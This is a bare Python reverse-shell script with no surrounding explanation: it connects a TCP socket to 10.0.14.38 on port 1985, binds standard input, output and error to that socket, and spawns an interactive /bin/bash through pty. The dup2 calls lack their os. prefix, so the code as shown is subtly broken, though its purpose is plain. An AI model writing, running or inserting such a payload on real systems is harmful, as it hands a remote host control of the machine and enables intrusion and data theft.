import socket,subprocess,os
import pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.14.38",1985))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)

pty.spawn("/bin/bash")
